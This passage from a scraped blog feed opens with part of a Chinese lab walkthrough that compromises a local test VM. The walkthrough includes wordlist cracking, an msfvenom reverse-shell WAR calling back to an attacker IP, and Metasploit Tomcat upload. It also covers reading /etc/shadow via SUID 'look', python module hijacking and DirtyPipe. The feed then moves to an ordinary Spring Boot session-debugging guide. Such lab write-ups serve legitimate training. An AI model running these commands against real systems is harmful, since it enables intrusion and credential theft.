</font><font style=\"color: rgba(77, 77, 77, 1);\">2. 确认握手包有效（</font><code>&lt;font style=\"color:rgb(77, 77, 77);\"&gt;aircrack-ng&lt;/font&gt;</code><font style=\"color: rgba(77, 77, 77, 1);\"> 能识别）。</font></td>\n<td style=\"text-align: left;\"><code>&lt;font style=\"color:rgb(77, 77, 77);\"&gt;aircrack-ng -w /usr/share/wordlists/rockyou.txt capture_file.cap&lt;/font&gt;</code></td>\n<td style=\"text-align: left;\"><strong>离线破解无线密码</strong><font style=\"color: rgba(77, 77, 77, 1);\">。核心是捕获到用户连接时的握手包。破解速度取决于密码在字典中的位置及硬件算力。</font></td>\n</tr>\n<tr>\n<td style=\"text-align: left;\"><strong>加密的 PDF 文件</strong></td>\n<td style=\"text-align: left;\"><code>&lt;font style=\"color:rgb(77, 77, 77);\"&gt;john&lt;/font&gt;</code><font style=\"color: rgba(77, 77, 77, 1);\"> 或 </font><code>&lt;font style=\"color:rgb(77, 77, 77);\"&gt;pdfcrack&lt;/font&gt;</code></td>\n<td style=\"text-align: left;\"><font style=\"color: rgba(77, 77, 77, 1);\">使用 </font><code>&lt;font style=\"color:rgb(77, 77, 77);\"&gt;pdf2john&lt;/font&gt;</code><font style=\"color: rgba(77, 77, 77, 1);\"> 或 </font><code>&lt;font style=\"color:rgb(77, 77, 77);\"&gt;pdfcrack&lt;/font&gt;</code><font style=\"color: rgba(77, 77, 77, 1);\"> 提取或直接破解。</font></td>\n<td style=\"text-align: left;\"><strong>使用 John:</strong><font style=\"color: rgba(77, 77, 77, 1);\">   </font><code>&lt;font style=\"color:rgb(77, 77, 77);\"&gt;pdf2john target.pdf &gt; pdf_hash.txt&lt;/font&gt;</code><font style=\"color: rgba(77, 77, 77, 1);\">   </font><code>&lt;font style=\"color:rgb(77, 77, 77);\"&gt;john --wordlist=/usr/share/wordlists/rockyou.txt pdf_hash.txt&lt;/font&gt;</code><font style=\"color: rgba(77, 77, 77, 1);\">   </font><strong>使用 pdfcrack:</strong><font style=\"color: rgba(77, 77, 77, 1);\">   </font><code>&lt;font style=\"color:rgb(77, 77, 77);\"&gt;pdfcrack -f target.pdf -w /usr/share/wordlists/rockyou.txt&lt;/font&gt;</code></td>\n<td style=\"text-align: left;\"><font style=\"color: rgba(77, 77, 77, 1);\">思路与 RAR 类似，先提取密码哈希（如果支持），再用字典攻击。</font></td>\n</tr>\n</tbody>\n</table>\n<p><strong>字典路径</strong><font style=\"color: rgba(77, 77, 77, 1);\">： </font><code>&lt;font style=\"color:rgb(77, 77, 77);\"&gt;rockyou.txt&lt;/font&gt;</code><font style=\"color: rgba(77, 77, 77, 1);\"> 默认位于 </font><code>&lt;font style=\"color:rgb(77, 77, 77);\"&gt;/usr/share/wordlists/&lt;/font&gt;</code><font style=\"color: rgba(77, 77, 77, 1);\">。首次使用可能需要解压：</font></p>\n<pre><code class=\"language-bash\">sudo gunzip /usr/share/wordlists/rockyou.txt.gz\n</code></pre>\n<p>爆破：</p>\n<pre><code class=\"language-plain\">┌──(root㉿xiao)-[/opt]\n└─# fcrackzip -D -p /usr/share/wordlists/rockyou.txt -u backup.zip\n\n\nPASSWORD FOUND!!!!: pw == @administrator_hi5\n</code></pre>\n<p>得到密码：@administrator_hi5</p>\n\n<p><img alt=\"\" src=\"https://gitee.com/there-is-a-large-box/image/raw/master/issue/1767840515850-f1235a74-7eea-49a5-b887-170449b7c94b.png\" /></p>\n<p><strong>解压查看解压出来的内容：</strong></p>\n\n<p><img alt=\"\" src=\"https://gitee.com/there-is-a-large-box/image/raw/master/issue/1767840578959-7f6785d8-85b1-4677-b602-ab5675acc354.png\" /></p>\n<p><strong>在tomcat-user.xml文件中发现两个账户和密码</strong></p>\n<pre><code class=\"language-xml\">&lt;role rolename=\"manager-gui\"/&gt;\n&lt;user username=\"manager\" password=\"melehifokivai\" roles=\"manager-gui\"/&gt;\n\n&lt;role rolename=\"admin-gui\"/&gt;\n&lt;user username=\"admin\" password=\"melehifokivai\" roles=\"admin-gui, manager-gui\"/&gt;\n&lt;/tomcat-users&gt;\n</code></pre>\n<p><strong>账号1：manager melehifokivai</strong></p>\n<p><strong>账号2：admin melehifokivai</strong></p>\n<p><strong>账号登录</strong></p>\n<p>测试解压得到的账号密码</p>\n<p>admin和manager账户都能登录成功</p>\n<p><a href=\"http://192.168.222.134:8080/manager/html\" rel=\"noopener nofollow\" target=\"_blank\">http://192.168.222.134:8080/manager/html</a></p>\n\n<p><img alt=\"\" src=\"https://gitee.com/there-is-a-large-box/image/raw/master/issue/1767840894776-7a0986dc-ade3-4785-8e77-a35781f0265f.png\" /></p>\n<p>发现文件上传，可上传文件为<font style=\"color: rgba(0, 0, 0, 1);\">WAR文件</font></p>\n<p>访问http://192.168.222.134:8080/readme.txt</p>\n\n<p><img alt=\"\" src=\"https://gitee.com/there-is-a-large-box/image/raw/master/issue/1767841873877-cea13c4e-60ed-4e79-8b33-c75c05dc2b80.png\" /></p>\n<p>得到信息有一个加密文件猜测是backup.zip，猜测管理员为<strong><font style=\"color: rgba(0, 0, 0, 1);\">randy，</font></strong></p>\n<h1 id=\"0x02漏洞利用-\"><font style=\"color: rgba(0, 0, 0, 1);\">0x02漏洞利用 </font></h1>\n<h2 id=\"21toncat中war文件上传-shell\">2.1toncat中war文件上传-shell</h2>\n<p>msf生成<font style=\"color: rgba(15, 17, 21, 1);\">JSP 反向 Shell 的 WAR 文件</font></p>\n<pre><code class=\"language-python\">sudo msfvenom -p java/jsp_shell_reverse_tcp LHOST=\"192.168.222.137\" LPORT=8888 -f war &gt; shell.war\n</code></pre>\n\n<p><img alt=\"\" src=\"https://gitee.com/there-is-a-large-box/image/raw/master/issue/1768298973138-a6d047cf-fa8e-4324-a965-7454625b213a.png\" /></p>\n<p>上传</p>\n\n<p><img alt=\"\" src=\"https://gitee.com/there-is-a-large-box/image/raw/master/issue/1768299005190-63e670bc-10ff-40ee-a505-597111589c12.png\" /></p>\n<p>反弹shell</p>\n\n<p><img alt=\"\" src=\"https://gitee.com/there-is-a-large-box/image/raw/master/issue/1768299028082-c119a58c-a87b-4310-9efa-adc162f66a48.png\" /></p>\n<p><font style=\"color: rgba(85, 86, 102, 1); background-color: rgba(238, 240, 244, 1);\">GetShell之后，通过一段python代码创建要给交互式终端。</font></p>\n<pre><code class=\"language-python\">python3 -c 'import pty; pty.spawn(\"/bin/bash\")'\n</code></pre>\n\n<p><img alt=\"\" src=\"https://gitee.com/there-is-a-large-box/image/raw/master/issue/1768299297993-388f1683-17d1-41a5-a67d-c0bd5193a25c.png\" /></p>\n<pre><code class=\"language-python\"># 查询具备suid标志的文件\nfind / -perm -u=s -type f 2&gt;&gt;/dev/null\n# 查询当前用户是否有可利用sudo提权的命令\nsudo -l\n# 查看备份文件\nfind / -name \"*backup*\" 2&gt;&gt;/dev/null\n</code></pre>\n<p>查看home目录下面有两个用户：jaye  randy</p>\n<p>结合之前的账号密码来密码猜测：</p>\n<p>得到：jaye <strong>melehifokivai</strong></p>\n\n<p><img alt=\"\" src=\"https://gitee.com/there-is-a-large-box/image/raw/master/issue/1768300529905-de5d14bc-0e9c-44cc-9d2d-4bcf17e4f845.png\" /></p>\n<p>war文件上传：</p>\n<p><strong><font style=\"color: rgba(51, 51, 51, 1);\">WAR（Web Application Archive）</font></strong><font style=\"color: rgba(51, 51, 51, 1);\"> 是 Java Web 应用程序的标准打包格式，专为部署到 </font><strong><font style=\"color: rgba(51, 51, 51, 1);\">Servlet 容器</font></strong><font style=\"color: rgba(51, 51, 51, 1);\">（如 Tomcat、Jetty）而设计。它本质上是一个压缩文件（扩展名为 </font><code>&lt;font style=\"color:rgb(192, 52, 29);background-color:rgba(0, 0, 0, 0.04);\"&gt;.war&lt;/font&gt;</code><font style=\"color: rgba(51, 51, 51, 1);\">），遵循特定的目录结构，包含 Web 应用的所有代码、资源及配置。</font><br />\n一般情况利用思路：<br />\njsp马转换为war包上传</p>\n\n<p><img alt=\"\" src=\"https://gitee.com/there-is-a-large-box/image/raw/master/issue/1767861822414-ded9f771-cd70-4a24-9d87-89814e4b38be.png\" /></p>\n<h2 id=\"22-msf漏洞利用-shell\"><font style=\"color: rgba(15, 17, 21, 1);\">2.2 msf漏洞利用-shell</font></h2>\n<p><font style=\"color: rgba(29, 33, 41, 1); background-color: rgba(247, 248, 250, 1);\">msf 有Tomcat 上传webshell的模块，有用户名和密码就可以使用：</font></p>\n<pre><code class=\"language-python\">search tomcat upload\nuse 7\nshow options\n</code></pre>\n\n<p><img alt=\"\" src=\"https://gitee.com/there-is-a-large-box/image/raw/master/issue/1767847629830-5bfe712d-d3c4-4308-951e-91ce56938d85.png\" /></p>\n<p>查看需要设置的参数</p>\n\n<p><img alt=\"\" src=\"https://gitee.com/there-is-a-large-box/image/raw/master/issue/1767847669431-ba4df25a-d852-458b-8bb2-5a6692fab9b9.png\" /></p>\n\n<p><img alt=\"\" src=\"https://gitee.com/there-is-a-large-box/image/raw/master/issue/1767848191317-43a10ac8-f784-4c8f-83d5-eb2640f729fa.png\" /></p>\n\n<p><img alt=\"\" src=\"https://gitee.com/there-is-a-large-box/image/raw/master/issue/1767848225249-ef26df62-a3ce-48d8-9bb3-3c3dea3892ae.png\" /></p>\n\n<p><img alt=\"\" src=\"https://gitee.com/there-is-a-large-box/image/raw/master/issue/1767848242089-b16d2c47-3abe-4290-a029-dfb464358552.png\" /></p>\n\n<p><img alt=\"\" src=\"https://gitee.com/there-is-a-large-box/image/raw/master/issue/1767848253798-06b751ac-015c-4380-af43-529e6c93a457.png\" /></p>\n\n<p><img alt=\"\" src=\"https://gitee.com/there-is-a-large-box/image/raw/master/issue/1767848596168-2fc1bbc6-8597-475a-9ea9-485327445731.png\" /></p>\n<p>查看user.txt得到第一个flag</p>\n<p>home目录下有两个文件夹，加上之前readme.txt出来的猜测可能有两个用户，jaye和randy</p>\n<p>之前扫描端口的时候发现22端口开放<a target=\"_blank\">链接</a></p>\n<p>利用之前压缩包文件中得到的密码ssh一下这两个账户，jaye登录成功</p>\n<p><img alt=\"\" src=\"https://gitee.com/there-is-a-large-box/image/raw/master/issue/1767848497149-7dbcf576-9ce7-47c2-852e-40492d925636.png\" /></p>\n\n<p><img alt=\"\" src=\"https://gitee.com/there-is-a-large-box/image/raw/master/issue/1767848619500-c4b7c805-350c-41dc-b6ca-4d7fd3351d35.png\" /></p>\n<p>登录进来之后查找能利用的东西，先看看有些啥，，<br />\n<img alt=\"\" src=\"https://gitee.com/there-is-a-large-box/image/raw/master/issue/1767849098656-118fa5a4-a6ac-44bc-91d1-0a5c3d6de862.png\" /></p>\n\n<p><img alt=\"\" src=\"https://gitee.com/there-is-a-large-box/image/raw/master/issue/1767849163723-f3c0f89f-1b83-41a5-9171-857cecff071c.png\" /></p>\n<p>找到一个可执行文件look，是系统的look</p>\n\n<p><img alt=\"\" src=\"https://gitee.com/there-is-a-large-box/image/raw/master/issue/1767849251300-4e6e6ffc-3fed-42e4-aa90-4edeaea62133.png\" /></p>\n\n<p><img alt=\"\" src=\"https://gitee.com/there-is-a-large-box/image/raw/master/issue/1767849316970-058bd5f2-6df7-43e5-a15b-f20304385091.png\" /></p>\n<p>look可以越权访问，查看/etc/shadow</p>\n<p><code>look</code>越权命令使用方法：<a href=\"https://gtfobins.github.io/gtfobins/look/\" rel=\"noopener nofollow\" target=\"_blank\">https://gtfobins.github.io/gtfobins/look/</a></p>\n<pre><code class=\"language-shell\">LFILE=file_to_read\n./look '' \"$LFILE\"\n</code></pre>\n\n<p><img alt=\"\" src=\"https://gitee.com/there-is-a-large-box/image/raw/master/issue/1767852700836-c03d0b5f-941e-4693-ad5b-915f40692179.png\" /></p>\n\n<p><img alt=\"\" src=\"https://gitee.com/there-is-a-large-box/image/raw/master/issue/1767852711349-e7d362bb-b5fa-40ab-8ded-a88731ffad65.png\" /></p>\n<p><font style=\"color: rgba(29, 33, 41, 1); background-color: rgba(247, 248, 250, 1);\">把 /etc/shadow 文件和passwd文件复制下来,，保存到本地。/etc/passwd 文件可以在msf控制台获取，也可以用上述方式获取，使用 unshadow 命令生成需要破解的密码,我们只用爆破root的和rand就行了：</font></p>\n<pre><code class=\"language-shell\">unshadow passwd ushadow &gt; pass.txt\n</code></pre>\n<p><font style=\"color: rgba(29, 33, 41, 1); background-color: rgba(247, 248, 250, 1);\">用john破解一下,：</font></p>\n<pre><code class=\"language-shell\">john --wordlist=/usr/share/wordlists/rockyou.txt shadow\n</code></pre>\n\n<p><img alt=\"\" src=\"https://gitee.com/there-is-a-large-box/image/raw/master/issue/1767856185003-928062a7-c19a-41ae-8f39-75caa0ca1217.png\" /></p>\n<p><font style=\"color: rgba(29, 33, 41, 1); background-color: rgba(247, 248, 250, 1);\">爆破得到：randy:07051986randy</font></p>\n<p>登录<font style=\"color: rgba(29, 33, 41, 1); background-color: rgba(247, 248, 250, 1);\">randy</font></p>\n<p><font style=\"color: rgba(29, 33, 41, 1); background-color: rgba(247, 248, 250, 1);\">在根目录下发现一个python可执行 脚本</font></p>\n\n<p><img alt=\"\" src=\"https://gitee.com/there-is-a-large-box/image/raw/master/issue/1767857029281-ef4ba5b6-d896-4cd3-a25b-7cb5f4d57a4c.png\" /></p>\n<h2 id=\"23提权-文件\">2.3提权-文件</h2>\n<p>看一下权限，发现这个python文件不能修改</p>\n<p>看看可以干一些什么</p>\n\n<p><img alt=\"\" src=\"https://gitee.com/there-is-a-large-box/image/raw/master/issue/1767858343998-deb9e511-fc73-4e88-a2c9-a1e0adcc4385.png\" /></p>\n<p>但是在代码中引入了一个base64模块</p>\n<p>看看这个文件在python3.8目录下</p>\n\n<p><img alt=\"\" src=\"https://gitee.com/there-is-a-large-box/image/raw/master/issue/1767858240847-acdc523c-4639-488c-9e46-8e4de021ae4b.png\" /></p>\n<p>查看一下权限</p>\n\n<p><img alt=\"\" src=\"https://gitee.com/there-is-a-large-box/image/raw/master/issue/1767858360245-61c74e0b-e0d3-4491-9ae3-0011ca29dd54.png\" /></p>\n<p>可以编辑，写入shell</p>\n<pre><code class=\"language-python\">import os\n\nos.system(\"/bin/bash\")\n</code></pre>\n\n<p><img alt=\"\" src=\"https://gitee.com/there-is-a-large-box/image/raw/master/issue/1767860492323-7b06b3b3-5d88-45fc-b1c2-c856b3be623b.png\" /></p>\n\n<p><img alt=\"\" src=\"https://gitee.com/there-is-a-large-box/image/raw/master/issue/1767858778389-d04b98f1-7d28-48e9-a155-a9476a5c0690.png\" /></p>\n<p>执行脚本</p>\n\n<p><img alt=\"\" src=\"https://gitee.com/there-is-a-large-box/image/raw/master/issue/1767860567499-1dd3e58b-77b6-4435-869d-bc7ed67797bb.png\" /></p>\n\n<p><img alt=\"\" src=\"https://gitee.com/there-is-a-large-box/image/raw/master/issue/1767860580515-e2ea5737-c24a-40f1-a295-a7a12e457739.png\" /></p>\n<h2 id=\"24提权-内核漏洞\">2.4提权-内核漏洞</h2>\n<p>可用操作系统版本内核漏洞提权</p>\n<p>msf漏洞利用</p>\n<pre><code class=\"language-python\">search tomcat upload\nuse 7\noptions\n</code></pre>\n\n<p><img alt=\"\" src=\"https://gitee.com/there-is-a-large-box/image/raw/master/issue/1768397978392-13dde72c-191d-41c4-8872-1c7753ceb9d8.png\" /></p>\n\n<p><img alt=\"\" src=\"https://gitee.com/there-is-a-large-box/image/raw/master/issue/1768398030818-436e42b8-0a3a-45b5-9a25-b2c9a42c9868.png\" /></p>\n<p>设置参数开始利用</p>\n<pre><code class=\"language-python\">msf exploit(multi/http/tomcat_mgr_upload) &gt; set rhosts 192.168.222.135\nrhosts =&gt; 192.168.222.135\nmsf exploit(multi/http/tomcat_mgr_upload) &gt; set rport 8080\nrport =&gt; 8080\nmsf exploit(multi/http/tomcat_mgr_upload) &gt; set HttpUsername admin\nHttpUsername =&gt; admin\nmsf exploit(multi/http/tomcat_mgr_upload) &gt; set HttpPassword melehifokivai\nHttpPassword =&gt; melehifokivai\nmsf exploit(multi/http/tomcat_mgr_upload) &gt; options\nmsf exploit(multi/http/tomcat_mgr_upload) &gt; run\n</code></pre>\n\n<p><img alt=\"\" src=\"https://gitee.com/there-is-a-large-box/image/raw/master/issue/1768398081653-71bade4e-c0d2-45a8-9c30-5e1a059f7a3c.png\" /></p>\n\n<p><img alt=\"\" src=\"https://gitee.com/there-is-a-large-box/image/raw/master/issue/1768398170110-9c526eeb-edb1-41c0-b5b9-316eff262666.png\" /></p>\n<p>后台运行 session</p>\n<p>升级 Java Meterpreter → 原生 Linux Meterpreter</p>\n<pre><code class=\"language-plain\">background\nsessions -u 1\n</code></pre>\n<p>把 session 1（Java Meterpreter）升级成真正的 <strong>Linux x86 Meterpreter</strong>（session 2）</p>\n\n<p><img alt=\"\" src=\"https://gitee.com/there-is-a-large-box/image/raw/master/issue/1768398401444-52a916e1-31f3-44d7-aa84-a6092074f627.png\" /></p>\n<p>查看</p>\n<pre><code class=\"language-plain\">sessions l\n</code></pre>\n\n<p><img alt=\"\" src=\"https://gitee.com/there-is-a-large-box/image/raw/master/issue/1768398485753-8ed545b3-d3ca-4770-aa59-a76e1ecddf98.png\" /></p>\n<p>查看 DirtyPipe 提权模块 ，根据Linux 内核版本我们尝试利用的是cve-2022-0847</p>\n<pre><code class=\"language-plain\">search cve-2022-0847\nuse exploit/linux/local/cve_2022_0847_dirtypipe或者use 0\n</code></pre>\n\n<p><img alt=\"\" src=\"https://gitee.com/there-is-a-large-box/image/raw/master/issue/1768398537111-cb27b496-d3ff-414a-a7f6-fb46f493a3ca.png\" /></p>\n<p>设置参数</p>\n<pre><code class=\"language-plain\">set session 2 #设置使用的会话\nset lhost 192.168.222.137 #设置接收的IP\nrun\n</code></pre>\n\n<p><img alt=\"\" src=\"https://gitee.com/there-is-a-large-box/image/raw/master/issue/1768398723499-a7fa7fcb-9658-4edb-8ef7-a2a7da7c498d.png\" /></p>\n\n<p><img alt=\"\" src=\"https://gitee.com/there-is-a-large-box/image/raw/master/issue/1768398752106-102483b7-6610-4e75-87e6-d27b586c26fb.png\" /></p>\n\n<p><img alt=\"\" src=\"https://gitee.com/there-is-a-large-box/image/raw/master/issue/1768398839025-bc36ab9e-6a92-4a08-b340-4c3d2b4e0262.png\" /></p>\n\n</div>\n<div class=\"clear\"></div>\n\n            </div>\n            <div class=\"postDesc\">posted @ \n<span id=\"post-date\">2026-01-20 15:45</span>&nbsp;\n<a href=\"https://www.cnblogs.com/yuell\">有一大盒</a>&nbsp;\n阅读(<span id=\"post_view_count\">0</span>)&nbsp;\n评论(<span id=\"post_comment_count\">0</span>)&nbsp;\n&nbsp;\n<a href=\"\">收藏</a>&nbsp;\n<a href=\"\">举报</a>\n</div>"
    },
    {
      "title": "基于springboot系统，如何跟踪会话过期，浏览器会话标识是否收到正常响应，存储，并在后续请求保持携带",
      "link": "https://www.cnblogs.com/liuyangjava/p/19507022",
      "published": "",
      "description": "<h1 class=\"postTitle\">\n                <a class=\"postTitle2 vertical-middle\" href=\"https://www.cnblogs.com/liuyangjava/p/19507022\" id=\"cb_post_title_url\" title=\"发布于 2026-01-20 15:22\">\n    <span>基于springboot系统，如何跟踪会话过期，浏览器会话标识是否收到正常响应，存储，并在后续请求保持携带</span>\n    \n\n</a>\n\n            </h1>\n            <div class=\"clear\"></div>\n            <div class=\"postBody\">\n                <div class=\"blogpost-body blogpost-body-html\" id=\"cnblogs_post_body\">\n<p>今天我们分享一个项目开发中的出现操作某个业务时候，<span style=\"color: rgba(224, 62, 45, 1); font-size: 18px;\"><strong>出现闪退</strong></span>的经典问题，针对老旧的Spring MVC系统，要系统性地跟踪会话（Session）生命周期和Cookie的携带情况，我们需要一套清晰的、从浏览器到服务器的排查方案。以下是详细的跟踪步骤和方法。</p>\n<p>当然这个排查步骤和方法，也适合基本SpringBoot开发的系统，但是服务端的排查需要大家根据实际情况修改后端排查日志、拦截器等方法</p>\n<h3>整体排查思路</h3>\n<p>我们的目标是验证以下三个环节是否正常：</p>\n<ol class=\"ybc-ol-component ybc-ol-component_1\">\n<li class=\"ybc-li-component ybc-li-component_ol\">\n<p><strong>登录成功时</strong>：服务器是否正确生成了Session并返回了包含正确 <code class=\"hyc-common-markdown__code__inline\">JSESSIONID</code>的Cookie给浏览器。</p>\n</li>\n<li class=\"ybc-li-component ybc-li-component_ol\">\n<p><strong>浏览器端</strong>：浏览器是否成功接收并存储了该Cookie。</p>\n</li>\n<li class=\"ybc-li-component ybc-li-component_ol\">\n<p><strong>后续请求</strong>：浏览器在执行查询等操作时，是否始终在请求头中携带了这个Cookie。</p>\n</li>\n</ol>\n<h3>第一步：浏览器端跟踪（客户端验证）</h3>\n<p>这是最直接、最容易操作的第一步，可以由开发或运维人员在问题电脑上进行。</p>\n<p>一、跟踪会话标识（Cookie）的接收与存储</p>\n<ol class=\"ybc-ol-component ybc-ol-component_1\">\n<li class=\"ybc-li-component ybc-li-component_ol\">\n<p><strong>开启浏览器开发者工具</strong>：使用出现问题的浏览器（如奇安信、Chrome），按 <code class=\"hyc-common-markdown__code__inline\">F12</code>打开开发者工具。</p>\n</li>\n<li class=\"ybc-li-component ybc-li-component_ol\">\n<p><strong>切换到Network/网络面板</strong>：勾选 <strong><code class=\"hyc-common-markdown__code__inline\">Preserve log</code>(保留日志)</strong>​ 复选框，防止页面跳转时日志被清空。</p>\n</li>\n<li class=\"ybc-li-component ybc-li-component_ol\">\n<p><strong>清空Cookie（可选，为了纯净的测试）</strong>：在开发者工具的 <code class=\"hyc-common-markdown__code__inline\">Application</code>（应用）或 <code class=\"hyc-common-markdown__code__inline\">Storage</code>（存储）标签页下，找到 <code class=\"hyc-common-markdown__code__inline\">Cookies</code>，选中当前系统地址的Cookie，将其删除。这可以模拟一次全新的登录。</p>\n</li>\n<li class=\"ybc-li-component ybc-li-component_ol\">\n<p><strong>执行登录</strong>：</p>\n<ul class=\"ybc-ul-component\">\n<li class=\"ybc-li-component ybc-li-component_ul\">\n<p>在地址栏输入系统单节点地址（如 <code class=\"hyc-common-markdown__code__inline\">http://10.15.9.106/...</code>）进行登录。</p>\n</li>\n<li class=\"ybc-li-component ybc-li-component_ul\">\n<p>在Network面板中，找到登录请求（通常是 <code class=\"hyc-common-markdown__code__inline\">login</code>或 <code class=\"hyc-common-markdown__code__inline\">j_spring_security_check</code>之类的POST请求）。</p>\n</li>\n<li class=\"ybc-li-component ybc-li-component_ul\">\n<p><strong>重点查看登录请求的响应</strong>：</p>\n<ul class=\"ybc-ul-component\">\n<li class=\"ybc-li-component ybc-li-component_ul\">\n<p>点击这个登录请求，查看 <code class=\"hyc-common-markdown__code__inline\">Response Headers</code>（响应头）。</p>\n</li>\n<li class=\"ybc-li-component ybc-li-component_ul\">\n<p>你应该能看到一个 <code class=\"hyc-common-markdown__code__inline\">Set-Cookie</code>头，内容类似于 <code class=\"hyc-common-markdown__code__inline\">JSESSIONID=ABCD1234...; Path=/; HttpOnly</code>。</p>\n</li>\n<li class=\"ybc-li-component ybc-li-component_ul\">\n<p><strong>记录下这个 <code class=\"hyc-common-markdown__code__inline\">JSESSIONID</code>的值</strong>。</p>\n</li>\n</ul>\n</li>\n</ul>\n</li>\n<li class=\"ybc-li-component ybc-li-component_ol\">\n<p><strong>验证Cookie存储</strong>：</p>\n<ul class=\"ybc-ul-component\">\n<li class=\"ybc-li-component ybc-li-component_ul\">\n<p>切换到 <code class=\"hyc-common-markdown__code__inline\">Application/应用</code>标签页。</p>\n</li>\n<li class=\"ybc-li-component ybc-li-component_ul\">\n<p>在左侧找到 <code class=\"hyc-common-markdown__code__inline\">Cookies</code>-&gt; <code class=\"hyc-common-markdown__code__inline\">http://10.15.9.106</code>。</p>\n</li>\n<li class=\"ybc-li-component ybc-li-component_ul\">\n<p>检查是否存在一个名为 <code class=\"hyc-common-markdown__code__inline\">JSESSIONID</code>的Cookie，其值是否与刚才在响应头中看到的一致。</p>\n</li>\n</ul>\n</li>\n</ol>\n<p><strong>至此，我们验证了环节1和2。<span style=\"color: rgba(224, 62, 45, 1);\">如果这里就出问题，那么根源在服务器响应或浏览器安全策略上</span>。</strong></p>\n<p>二、跟踪后续请求的Cookie携带情况</p>\n<ol class=\"ybc-ol-component ybc-ol-component_1\">\n<li class=\"ybc-li-component ybc-li-component_ol\">\n<p><strong>进行正常操作</strong>：登录成功后，在系统内进行一些不会触发闪退的简单操作，比如点击菜单。</p>\n</li>\n<li class=\"ybc-li-component ybc-li-component_ol\">\n<p><strong>观察请求</strong>：在Network面板中，观察这些操作触发的Ajax或页面请求。</p>\n</li>\n<li class=\"ybc-li-component ybc-li-component_ol\">\n<p><strong>检查请求头</strong>：随机点击几个后续请求，查看它们的 <code class=\"hyc-common-markdown__code__inline\">Request Headers</code>（请求头）。</p>\n<ul class=\"ybc-ul-component\">\n<li class=\"ybc-li-component ybc-li-component_ul\">\n<p>必须找到一个 <code class=\"hyc-common-markdown__code__inline\">Cookie:</code>头，其内容应包含 <code class=\"hyc-common-markdown__code__inline\">JSESSIONID=ABCD1234...</code>（即登录时设置的那个值）。</p>\n</li>\n<li class=\"ybc-li-component ybc-li-component_ul\">\n<p><strong>确保每个请求都携带了这个Cookie</strong>。</p>\n</li>\n</ul>\n</li>\n<li class=\"ybc-li-component ybc-li-component_ol\">\n<p><strong>触发闪退（关键步骤）</strong>：</p>\n<ul class=\"ybc-ul-component\">\n<li class=\"ybc-li-component ybc-li-component_ul\">\n<p>进行那个<strong>已知会引发闪退的查询操作</strong>。</p>\n</li>\n<li class=\"ybc-li-component ybc-li-component_ul\">\n<p><strong>密切观察Network面板</strong>，在点击“查询”按钮后，瞬间发出的请求。</p>\n</li>\n<li class=\"ybc-li-component ybc-li-component_ul\">\n<p><strong>重点检查触发闪退的那个特定查询请求</strong>：</p>\n<ul class=\"ybc-ul-component\">\n<li class=\"ybc-li-component ybc-li-component_ul\">\n<p><strong>情况A（正常）</strong>：该请求的 <code class=\"hyc-common-markdown__code__inline\">Request Headers</code>里正常携带了 <code class=\"hyc-common-markdown__code__inline\">JSESSIONID</code>，但服务器返回了一个 <code class=\"hyc-common-markdown__code__inline\">302 Found</code>状态码，Location指向登录页，或者直接返回了登录页的HTML（状态码200）。<strong>这说明问题出在服务器端，服务器主动废弃了会话。</strong></p>\n</li>\n<li class=\"ybc-li-component ybc-li-component_ul\">\n<p><strong>情况B（异常）</strong>：该请求的 <code class=\"hyc-common-markdown__code__inline\">Request Headers</code>里<strong>没有</strong>​ <code class=\"hyc-common-markdown__code__inline\">Cookie</code>头，或者 <code class=\"hyc-common-markdown__code__inline\">JSESSIONID</code>的值变成了空、错误或一个新的值。<strong>这说明问题出在浏览器端，Cookie在发送前丢失了。</strong></p>\n</li>\n</ul>\n</li>\n</ul>\n</li>\n</ol>\n<p><span style=\"font-size: 16px;\"><strong>第二步：服务器端跟踪（代码与日志层面）</strong></span></p>\n<p>如果浏览器端跟踪指向了“情况A”（Cookie携带正常，但服务器返回登录页），那么问题根因在服务器内部。</p>\n<p>一、启用详细日志记录（最有效的方法）</p>\n<p>如果这个老系统可能日志不全，我们需要临时增加会话跟踪日志。</p>\n<p><strong>1.在<code class=\"hyc-common-markdown__code__inline\">web.xml</code>中配置Session监听器</strong>：</p>\n<p>创建一个类，实现 <code class=\"hyc-common-markdown__code__inline\">HttpSessionListener</code>和 <code class=\"hyc-common-markdown__code__inline\">HttpSessionAttributeListener</code>接口，并部署到生产环境。这个类可以记录Session的创建、销毁和属性变化。</p>\n<pre class=\"language-java highlighter-hljs\"><code>import javax.servlet.http.HttpSessionEvent;\nimport javax.servlet.http.HttpSessionAttributeListener;\nimport javax.servlet.http.HttpSessionBindingEvent;\nimport java.util.logging.Logger; // 或使用Log4j、Slf4j\n\npublic class SessionDebugListener implements HttpSessionListener, HttpSessionAttributeListener {\n\n    private static final Logger logger = Logger.getLogger(SessionDebugListener.class.getName());\n\n    @Override\n    public void sessionCreated(HttpSessionEvent se) {\n        logger.info(\"！！！ Session被创建: ID=\" + se.getSession().getId() + \"， 时间=\" + new java.util.Date());\n    }\n\n    @Override\n    public void sessionDestroyed(HttpSessionEvent se) {\n        // 这是最关键的信息！会话何时、为何被销毁？\n        logger.info(\"！！！ Session被销毁: ID=\" + se.getSession().getId() + \"， 时间=\" + new java.util.Date() + \"。 最后访问时间: \" + new java.util.Date(se.getSession().getLastAccessedTime()));\n        // 可以在这里打印堆栈信息，看是哪个线程触发了销毁\n        Thread.dumpStack();\n    }\n\n    @Override\n    public void attributeAdded(HttpSessionBindingEvent event) {\n        if (\"user\".equals(event.getName())) { // 监听用户登录属性\n            logger.info(\"！！！ 用户登录成功，User对象被存入Session。 SessionID=\" + event.getSession().getId() + \", User=\" + event.getValue());\n        }\n    }\n\n    @Override\n    public void attributeRemoved(HttpSessionBindingEvent event) {\n        if (\"user\".equals(event.getName())) { // 监听用户登出属性\n            logger.info(\"！！！ 用户登出，User对象从Session移除。 SessionID=\" + event.getSession().getId());\n        }\n    }\n}</code></pre>\n<p>在 <code class=\"hyc-common-markdown__code__inline\">web.xml</code>中注册：</p>\n<pre class=\"language-xml highlighter-hljs\"><code>&lt;listener&gt;\n    &lt;listener-class&gt;com.yourcompany.SessionDebugListener&lt;/listener-class&gt;\n&lt;/listener&gt;</code></pre>\n<p><strong>2.在过滤器中记录请求</strong>：</p>\n<p>在一个全局的Filter中（如果已有，则修改它），记录每个请求的Session状态。</p>\n<pre class=\"language-java highlighter-hljs\"><code>public class SessionTrackingFilter implements Filter {\n    @Override\n    public void doFilter(ServletRequest request, ServletResponse response, FilterChain chain) throws IOException, ServletException {\n        HttpServletRequest req = (HttpServletRequest) request;\n        HttpServletResponse res = (HttpServletResponse) response;\n\n        String sessionId = req.getRequestedSessionId();\n        boolean sessionValid = req.isRequestedSessionIdValid();\n\n        